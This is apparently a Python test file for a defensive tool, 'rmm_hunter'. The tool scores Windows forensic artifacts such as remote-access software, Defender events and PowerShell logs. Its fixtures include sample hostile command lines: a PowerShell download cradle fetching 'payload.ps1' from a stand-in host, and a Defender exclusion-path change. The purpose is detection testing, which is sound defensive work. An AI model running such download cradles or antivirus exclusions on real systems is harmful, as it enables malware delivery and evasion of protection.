import importlib.util
import json
from pathlib import Path
import tempfile
import unittest


ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / "rmm_hunter.py"
spec = importlib.util.spec_from_file_location("rmm_hunter", MODULE_PATH)
rmm_hunter = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(rmm_hunter)


class RuleTests(unittest.TestCase):
    def test_known_rmm_service_from_downloads_is_high_risk(self):
        sample = json.loads((ROOT / "tests" / "sample_artifacts_high_risk.json").read_text(encoding="utf-8"))
        report = rmm_hunter.analyze_artifacts(sample)

        self.assertEqual(report["verdict"], "high_risk")
        self.assertTrue(report["recommendations"])
        categories = {finding["category"] for finding in report["findings"]}
        self.assertIn("known_rmm_service", categories)
        self.assertIn("service_from_user_writable_path", categories)
        self.assertIn("encoded_powershell", categories)
        self.assertTrue(all(finding.get("plain_language") for finding in report["findings"]))
        self.assertTrue(all(finding.get("recommended_actions") for finding in report["findings"]))

    def test_known_program_files_rmm_needs_review_not_high_by_itself(self):
        collection = {
            "artifacts": {
                "installed_programs": [
                    {
                        "display_name": "TeamViewer",
                        "publisher": "TeamViewer Germany GmbH",
                        "install_location": "C:\\Program Files\\TeamViewer"
                    }
                ],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["verdict"], "needs_review")
        self.assertEqual(report["findings"][0]["severity"], "medium")

    def test_empty_collection_is_clean(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["verdict"], "clean")
        self.assertEqual(report["findings"], [])

    def test_repeated_defender_events_group_into_one_finding(self):
        event = {
            "log_name": "Microsoft-Windows-Windows Defender/Operational",
            "id": 5007,
            "time_created_utc": "2026-05-07T00:00:00Z",
            "message": "Defender configuration changed"
        }
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    event,
                    {**event, "time_created_utc": "2026-05-07T00:01:00Z"},
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(len(report["findings"]), 1)
        self.assertEqual(report["findings"][0]["artifact_count"], 2)
        self.assertEqual(report["findings"][0]["category"], "defender_routine_configuration_event")
        self.assertEqual(report["findings"][0]["severity"], "low")

    def test_sensitive_defender_config_changes_stay_medium(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 5007,
                        "time_created_utc": "2026-05-07T00:00:00Z",
                        "message": "Microsoft Defender Antivirus Configuration has changed. New value: HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
                    }
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"][0]["category"], "defender_sensitive_configuration_event")
        self.assertEqual(report["findings"][0]["severity"], "medium")

    def test_internal_defender_notification_key_is_routine(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 5007,
                        "time_created_utc": "2026-05-07T00:00:00Z",
                        "message": "Microsoft Defender Antivirus Configuration has changed. New value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\EcsConfigs\\MpDisablePropBagNotification = 0x0",
                    }
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"][0]["category"], "defender_routine_configuration_event")
        self.assertEqual(report["findings"][0]["severity"], "low")

    def test_powershell_download_context_extracts_domains(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [
                    {
                        "id": 403,
                        "message": "HostApplication=powershell.exe -NoProfile -Command Invoke-WebRequest -Uri 'https://phishanalyze.mdpstudio.com.au/api/health' -UseBasicParsing",
                    }
                ],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        artifact = report["findings"][0]["artifacts"][0]

        self.assertEqual(report["findings"][0]["category"], "powershell_download_cradle")
        self.assertIn("phishanalyze.mdpstudio.com.au", artifact["network_domains"])
        self.assertIn("PowerShell referenced phishanalyze.mdpstudio.com.au", artifact["detail"])

    def test_defender_context_extracts_action_resource_and_setting_values(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 1117,
                        "time_created_utc": "2026-05-07T00:00:00Z",
                        "data": {
                            "Threat Name": "Trojan:Win32/ClickFix.EEI!MTB",
                            "Action Name": "Remove",
                            "Error Description": "The operation completed successfully.",
                            "Detection Time": "2026-05-07T00:00:00Z",
                            "Source Name": "System",
                            "Path": "CmdLine:_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command Invoke-WebRequest https://example.test/payload.ps1",
                        },
                    },
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 5007,
                        "time_created_utc": "2026-05-07T00:01:00Z",
                        "data": {
                            "Old Value": "HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x1",
                            "New Value": "HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
                        },
                    },
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        malware_artifact = next(f for f in report["findings"] if f["category"] == "defender_malware_event")["artifacts"][0]
        config_artifact = next(f for f in report["findings"] if f["category"] == "defender_sensitive_configuration_event")["artifacts"][0]

        self.assertEqual(malware_artifact["threat_name"], "Trojan:Win32/ClickFix.EEI!MTB")
        self.assertEqual(malware_artifact["defender_action"], "Remove")
        self.assertIn("powershell.exe", malware_artifact["affected_resource"].lower())
        self.assertIn("Exclusions\\Paths", config_artifact["new_setting_path"])
        self.assertEqual(config_artifact["new_setting_value"], "0x0")

    def test_system_trust_health_flags_stale_defender_and_signature_failure(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_status": [
                    {
                        "am_service_enabled": True,
                        "antivirus_enabled": True,
                        "real_time_protection_enabled": True,
                        "behavior_monitor_enabled": True,
                        "ioav_protection_enabled": True,
                        "on_access_protection_enabled": True,
                        "antivirus_signature_age_days": 4,
                        "antivirus_signature_version": "1.449.1.0",
                        "exclusion_path_count": 1,
                        "exclusion_path_samples": ["C:\\Users\\meidi\\Downloads\\*"],
                    }
                ],
                "code_signing_trust": [
                    {
                        "check": "windows_binary_signature",
                        "name": "notepad.exe",
                        "path": "C:\\Windows\\System32\\notepad.exe",
                        "status": "NotTrusted",
                        "status_message": "A certificate chain processed, but terminated in a root certificate which is not trusted.",
                    }
                ],
                "trusted_root_store": [
                    {
                        "check": "trusted_root_store_summary",
                        "store": "LocalMachine\\Root",
                        "scope": "local_machine",
                        "total_count": 120,
                        "expired_count": 0,
                        "private_key_count": 0,
                    }
                ],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        categories = {finding["category"] for finding in report["findings"]}
        statuses = {check["check"]: check["status"] for check in report["system_trust_health"]}

        self.assertEqual(report["verdict"], "high_risk")
        self.assertIn("defender_health_issue", categories)
        self.assertIn("trust_validation_issue", categories)
        self.assertEqual(statuses["defender_security_intelligence_age"], "needs_review")
        self.assertEqual(statuses["windows_code_signing_validation"], "high_risk")

    def test_healthy_system_trust_checks_do_not_create_findings(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_status": [
                    {
                        "am_service_enabled": True,
                        "antivirus_enabled": True,
                        "real_time_protection_enabled": True,
                        "behavior_monitor_enabled": True,
                        "ioav_protection_enabled": True,
                        "on_access_protection_enabled": True,
                        "antivirus_signature_age_days": 0.25,
                        "antivirus_signature_version": "1.449.1.0",
                    }
                ],
                "code_signing_trust": [
                    {
                        "check": "windows_binary_signature",
                        "name": "notepad.exe",
                        "path": "C:\\Windows\\System32\\notepad.exe",
                        "status": "Valid",
                    }
                ],
                "trusted_root_store": [
                    {
                        "check": "trusted_root_store_summary",
                        "store": "LocalMachine\\Root",
                        "scope": "local_machine",
                        "total_count": 120,
                        "expired_count": 0,
                        "private_key_count": 0,
                    }
                ],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["verdict"], "clean")
        self.assertEqual(report["findings"], [])
        self.assertTrue(all(check["status"] == "ok" for check in report["system_trust_health"]))

    def test_release_manifest_powershell_is_treated_as_self_noise(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [
                    {
                        "id": 4104,
                        "message": "powershell -NoProfile -ExecutionPolicy Bypass -File .\\scripts\\generate-release-manifest.ps1 -ReleaseDir release",
                    }
                ],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"], [])

    def test_mapped_detection_export_preserves_verdict_and_mappings(self):
        sample = json.loads((ROOT / "tests" / "sample_artifacts_high_risk.json").read_text(encoding="utf-8"))
        report = rmm_hunter.analyze_artifacts(sample)
        mapped = rmm_hunter.build_mapped_detection_export(report)

        self.assertEqual(mapped["profile"], "rmm-hunter.detection-mapping.v1")
        self.assertEqual(mapped["verdict"], report["verdict"])
        self.assertEqual(mapped["risk_score"], report["risk_score"])
        self.assertTrue(all("plain_language" in finding for finding in mapped["findings"]))
        self.assertTrue(all("recommended_actions" in finding for finding in mapped["findings"]))
        rule_ids = {finding["rule_id"] for finding in mapped["findings"]}
        self.assertIn("known_rmm_service", rule_ids)
        sigma_tags = {
            tag
            for finding in mapped["findings"]
            for tag in finding["interoperability"]["sigma_tags"]
        }
        self.assertIn("attack.t1219", sigma_tags)
        self.assertIn("attack.t1059.001", sigma_tags)

    def test_anydesk_connection_log_is_very_strong_evidence(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "rmm_vendor_logs": [
                    {
                        "tool": "AnyDesk",
                        "artifact_role": "connection_log",
                        "evidence_question": "connected",
                        "name": "connection_trace.txt",
                        "path": "C:\\ProgramData\\AnyDesk\\connection_trace.txt",
                        "last_write_time_utc": "2026-05-17T10:30:00Z",
                        "sample_lines": ["2026-05-17 10:30 incoming session 12345"],
                    }
                ],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        finding = report["findings"][0]

        self.assertEqual(report["verdict"], "needs_review")
        self.assertEqual(finding["category"], "rmm_connection_log")
        self.assertEqual(finding["evidence_strength"], "very_strong")
        self.assertEqual(finding["confidence_label"], "high")
        self.assertTrue(report["timeline"])
        self.assertEqual(report["timeline"][0]["category"], "rmm_connection_log")

    def test_kape_import_parses_remote_tool_rows(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            output_dir = root / "Modules" / "Amcache"
            output_dir.mkdir(parents=True)
            csv_path = output_dir / "Amcache_UnassociatedFileEntries.csv"
            csv_path.write_text(
                "Name,Path,LastModifiedTime\n"
                "AnyDesk.exe,C:\\Users\\Public\\AnyDesk.exe,2026-05-17T08:00:00Z\n",
                encoding="utf-8",
            )

            collection = rmm_hunter.import_kape_output(root)
            report = rmm_hunter.analyze_artifacts(collection)

        categories = {finding["category"] for finding in report["findings"]}
        first_artifact = report["findings"][0]["artifacts"][0]
        self.assertIn("kape_execution_reference", categories)
        self.assertEqual(first_artifact["tool"], "AnyDesk")
        self.assertEqual(first_artifact["artifact_kind"], "amcache")
        self.assertEqual(first_artifact["evidence_question"], "executed")
        self.assertEqual(first_artifact["observed_time_utc"], "2026-05-17T08:00:00Z")
        self.assertTrue(report["timeline"])
        self.assertEqual(report["timeline"][0]["time_utc"], "2026-05-17T08:00:00Z")


if __name__ == "__main__":
    unittest.main()
